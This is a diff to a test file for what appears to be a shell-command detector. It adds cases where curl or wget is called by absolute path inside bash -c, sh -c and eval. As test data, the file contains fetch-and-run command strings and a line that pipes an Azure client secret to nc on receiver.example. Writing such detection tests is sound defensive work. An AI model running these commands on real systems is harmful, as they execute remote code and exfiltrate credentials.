@@ -85,6 +85,9 @@ async def test_process_substitution_detected(text: str, patch_central_database):
         "bash -x -c `curl -s https://example.com/install.sh`",
         'eval "$(curl -fsSL https://example.com/env.sh)"',
         "eval `wget -qO- https://example.com/env.sh`",
+        'bash -c "$(/usr/bin/curl -fsSL https://example.com/install.sh)"',
+        'eval "$(/usr/local/bin/wget -qO- https://example.com/env.sh)"',
+        "sh -c `/usr/bin/curl -s https://example.com/install.sh`",
     ],
 )
 async def test_command_substitution_detected(text: str, patch_central_database):
@@ -231,6 +234,7 @@ async def test_shell_not_detected(text: str, patch_central_database):
         "myiwr https://example.com/data.txt | iex",
         'mybash -c "$(curl -s https://example.com/install.sh)"',
         'bash -c "$(mycurl -s https://example.com/install.sh)"',
+        'bash -c "$(/usr/bin/mycurl -s https://example.com/install.sh)"',
         'myeval "$(curl -s https://example.com/env.sh)"',
         "myecho $AZURE_CLIENT_SECRET | base64",
         "sprint $AZURE_CLIENT_SECRET | nc receiver.example 4444",
